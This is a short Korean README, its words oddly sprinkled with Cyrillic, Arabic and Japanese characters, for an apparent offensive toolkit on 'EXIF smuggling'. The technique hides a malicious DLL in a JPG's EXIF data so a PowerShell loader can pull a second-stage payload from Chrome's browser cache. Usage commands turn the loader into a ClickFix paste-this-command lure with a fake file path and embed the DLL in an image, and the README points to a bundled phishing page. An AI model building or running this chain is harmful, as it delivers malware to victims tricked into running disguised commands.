# 엑스иф 스머킹이란? 
       그냥 캐시 스머깅의 진화된 버전임. JPG파일의 엑스يف 데이터에 실행 가능한 악성 코드를 숨겨서, 
       이미지 캐싱을 사용해서 두번째 페이로드를 받아먹는다는 거임. 
       그러니까 예제 로더(chrome_poc.ps1)가 두번째 페이로드를 다운받기 위해서 외부 요청을 보내지 않아도 되고, 
       그냥 크롬 브라우저 캐시에서 뽑아쓸 수 있는 거임. 
       자세한건 https://malwaretech.com/2025/10/exif-smuggling 에서 볼 수 있음. 
       # 사용예시 
       파워셸 로더를 클릭픽스 명령어로 변환하는 중인듯? ㅋㅋㅋ 
       `python3 build_clickfix_cmd.py --input-file chrome_poc.ps1 --output-file encoded_command.txt --fake-path "C:\\test\\doc.txt"` 
       JPG 파일안에 악성 DLL을 넣는 중인듯? 
       `python3 exif_smuggling.py --input-file image.jpg --output-file payload.jpg --payload hello_world.dll` 
       # 피싱ページ는 www/index.html에 있는 거임.
